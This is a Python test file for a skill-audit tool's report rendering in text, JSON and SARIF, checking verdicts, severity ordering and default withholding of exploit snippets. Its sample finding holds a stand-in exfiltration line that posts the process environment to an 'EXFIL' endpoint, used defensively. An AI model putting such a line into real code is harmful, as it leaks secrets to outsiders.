# Copyright(C) 2025-2026 Advanced Micro Devices, Inc. All rights reserved.
# SPDX-License-Identifier: MIT
"""
Audit report rendering (issue #2468).

Three surfaces: text for the author at the terminal, JSON for the publish path,
and SARIF for GitHub code scanning — which is the private channel the repo's
security-disclosure policy requires for exploitable detail.
"""

from __future__ import annotations

import json

from gaia.skills.audit import (
    AUDIT_ENGINE,
    AuditReport,
    Finding,
    render_json,
    render_sarif,
    render_text,
)


def _finding(**overrides) -> Finding:
    defaults = dict(
        rule_id="permission.undeclared.network",
        severity="high",
        category="permission-truth",
        message="Uses the 'network' domain but does not declare it.",
        file="tools.py",
        line=12,
        remediation="Add 'network:read' to metadata.gaia.permissions.",
        snippet="requests.post(EXFIL, data=os.environ)",
    )
    defaults.update(overrides)
    return Finding(**defaults)


def _report(**overrides) -> AuditReport:
    defaults = dict(
        skill="demo",
        version="1.0.0",
        security_tier="community",
        verdict="REVIEW",
        reason="Held for review at the 'community' tier.",
        findings=(_finding(),),
        cleared_tiers=("experimental",),
        content_digest="sha256:" + "cd" * 32,
        audited_at="2026-07-30T09:00:00+00:00",
    )
    defaults.update(overrides)
    return AuditReport(**defaults)


# ----------------------------------------------------------------------
# Text
# ----------------------------------------------------------------------


def test_text_leads_with_the_verdict():
    text = render_text(_report())
    assert text.splitlines()[0].strip().startswith("REVIEW")


def test_text_names_file_line_severity_and_the_fix():
    text = render_text(_report())
    assert "tools.py:12" in text
    assert "high" in text
    assert "metadata.gaia.permissions" in text


def test_text_states_the_tier_and_what_was_cleared():
    text = render_text(_report())
    assert "community" in text
    assert "experimental" in text


def test_text_withholds_snippets_by_default():
    """Exploitable detail is opt-in even locally."""
    assert "os.environ" not in render_text(_report())


def test_text_shows_snippets_when_asked():
    assert "os.environ" in render_text(_report(), include_snippets=True)


def test_clean_report_says_so_without_a_findings_table():
    text = render_text(
        _report(
            verdict="ALLOW",
            findings=(),
            reason="No findings.",
            cleared_tiers=("experimental", "community"),
        )
    )
    assert text.splitlines()[0].strip().startswith("ALLOW")
    assert "No findings" in text


def test_text_orders_findings_worst_first():
    report = _report(
        findings=(
            _finding(severity="low", rule_id="a.low"),
            _finding(severity="critical", rule_id="b.critical"),
            _finding(severity="medium", rule_id="c.medium"),
        )
    )
    text = render_text(report)
    assert text.index("b.critical") < text.index("c.medium") < text.index("a.low")


def test_text_includes_a_severity_summary():
    report = _report(
        findings=(_finding(severity="high"), _finding(severity="low", rule_id="x.y"))
    )
    text = render_text(report)
    assert "1" in text and "high" in text and "low" in text


# ----------------------------------------------------------------------
# JSON
# ----------------------------------------------------------------------


def test_json_is_the_wire_payload():
    payload = json.loads(render_json(_report()))
    assert payload["verdict"] == "REVIEW"
    assert payload["engine"] == AUDIT_ENGINE
    assert payload["skill"] == "demo"
    assert payload["cleared_tiers"] == ["experimental"]
    assert payload["content_digest"].startswith("sha256:")


def test_json_withholds_snippets_by_default():
    assert "snippet" not in json.loads(render_json(_report()))["findings"][0]


def test_json_includes_snippets_when_asked():
    payload = json.loads(render_json(_report(), include_snippets=True))
    assert payload["findings"][0]["snippet"]


def test_json_round_trips_back_into_a_report():
    original = _report()
    restored = AuditReport.from_dict(
        json.loads(render_json(original, include_snippets=True))
    )
    assert restored == original


def test_the_default_payload_loses_the_snippet_on_purpose():
    """Withholding is the contract, so the default round-trip is lossy."""
    original = _report()
    restored = AuditReport.from_dict(json.loads(render_json(original)))
    assert restored != original
    assert restored.findings[0].snippet is None
    assert restored.verdict == original.verdict


# ----------------------------------------------------------------------
# SARIF — the private disclosure channel
# ----------------------------------------------------------------------


def test_sarif_is_version_2_1_0():
    sarif = json.loads(render_sarif(_report()))
    assert sarif["version"] == "2.1.0"
    assert sarif["$schema"].endswith(".json")


def test_sarif_names_the_driver_and_its_version():
    driver = json.loads(render_sarif(_report()))["runs"][0]["tool"]["driver"]
    assert driver["name"] == "gaia-skill-audit"
    assert driver["version"] == AUDIT_ENGINE.split("/", 1)[1]


def test_sarif_declares_a_rule_per_distinct_rule_id():
    report = _report(
        findings=(
            _finding(rule_id="a.one"),
            _finding(rule_id="a.one"),
            _finding(rule_id="b.two"),
        )
    )
    rules = json.loads(render_sarif(report))["runs"][0]["tool"]["driver"]["rules"]
    assert [r["id"] for r in rules] == ["a.one", "b.two"]


def test_sarif_result_points_at_the_file_and_line():
    result = json.loads(render_sarif(_report()))["runs"][0]["results"][0]
    location = result["locations"][0]["physicalLocation"]
    assert location["artifactLocation"]["uri"] == "tools.py"
    assert location["region"]["startLine"] == 12


def test_sarif_maps_severity_onto_sarif_levels():
    def level(severity: str) -> str:
        report = _report(findings=(_finding(severity=severity),))
        return json.loads(render_sarif(report))["runs"][0]["results"][0]["level"]

    assert level("critical") == "error"
    assert level("high") == "error"
    assert level("medium") == "warning"
    assert level("low") == "note"
    assert level("info") == "note"


def test_sarif_carries_the_remediation_in_the_message():
    result = json.loads(render_sarif(_report()))["runs"][0]["results"][0]
    assert "metadata.gaia.permissions" in result["message"]["text"]


def test_sarif_uses_a_uri_base_when_the_skill_is_nested():
    sarif = json.loads(render_sarif(_report(), path_prefix="hub/skills/demo"))
    uri = sarif["runs"][0]["results"][0]["locations"][0]["physicalLocation"][
        "artifactLocation"
    ]["uri"]
    assert uri == "hub/skills/demo/tools.py"


def test_sarif_omits_snippets_by_default():
    """SARIF goes to code scanning, but the policy is opt-in everywhere."""
    assert "os.environ" not in render_sarif(_report())


def test_sarif_of_a_clean_report_has_no_results():
    sarif = json.loads(render_sarif(_report(verdict="ALLOW", findings=())))
    assert sarif["runs"][0]["results"] == []


def test_sarif_line_zero_is_normalized_to_one():
    """SARIF regions are 1-indexed; a manifest-level finding has no line."""
    report = _report(findings=(_finding(file="SKILL.md", line=0),))
    region = json.loads(render_sarif(report))["runs"][0]["results"][0]["locations"][0][
        "physicalLocation"
    ]["region"]
    assert region["startLine"] == 1
